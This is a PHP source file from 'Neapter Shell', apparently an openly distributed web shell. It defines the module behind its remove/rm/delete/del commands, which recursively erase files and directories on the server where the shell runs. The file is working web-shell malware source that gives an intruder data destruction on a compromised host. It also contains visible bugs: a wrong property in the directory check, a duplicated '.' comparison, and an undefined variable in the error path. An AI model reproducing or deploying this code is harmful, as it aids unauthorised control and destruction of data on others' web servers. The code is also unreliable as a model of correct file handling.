<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Usuwanie pliku / katalogu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleRemove extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array
        (
            'remove',
            'rm',
            'delete',
            'del',
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.2 2011-11-02 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie

	Użycie:
		remove ścieżka_do_katalogu_lub_pliku
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oShell->iArgc === 0) {
            return self::getHelp();
        }

        $sOutput = NULL;

        /**
         * Jezeli podana sciezka to plik
         */
        if (is_file($this->oShell->sArgv)) {
            if (!unlink($this->oShell->sArgv)) {
                return sprintf('Plik "%s" <span class="red">nie został usunięty</span>', $this->oShell->sArgv);
            }

            return sprintf('Plik "%s" <span class="green">został usunięty</span>', $this->oShell->sArgv);
        }
        /**
         * Jezeli podana sciezka to katalog
         */
        if (is_dir($this->sArgv)) {
            try {
                $oDirectory = new RecursiveIteratorIterator(new XRecursiveDirectoryIterator($this->oShell->sArgv), RecursiveIteratorIterator::CHILD_FIRST);

                foreach ($oDirectory as $oFile) {
                    if ($oFile->isDir()) {
                        /**
                         * PHP 5.2.X nie posiada stalej RecursiveDirectoryIterator::SKIP_DOTS
                         */
                        if (($oFile->getBasename() === '.') || ($oFile->getBasename() === '.')) {
                            continue;
                        }

                        /**
                         * Usuwanie katalogu
                         */
                        if (!rmdir($oFile->getPathname())) {
                            $sOutput .= sprintf("Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile->getPathname());
                        }
                    } else {
                        /**
                         * Usuwanie pliku
                         */
                        if (!unlink($oFile->getPathname())) {
                            $sOutput .= sprintf("Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile->getPathname());
                        }
                    }
                }

                $oDirectory = NULL;

                /**
                 * Usuwanie ostatniego katalogu
                 */
                if (!rmdir($this->oShell->sArgv)) {
                    return $sOutput . sprintf('Katalog "%s" <span class="red">nie został usunięty</span>', $this->oShell->sArgv);
                }
            } catch (Exception $oException) {
                return sprintf("Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException->getMessage());
            }

            return sprintf('Katalog "%s" <span class="green">został usunięty</span>', $this->oShell->sArgv);
        }

        return sprintf('Podana ścieżka "%s" nie istnieje', $this->oShell->sArgv);
    }

}
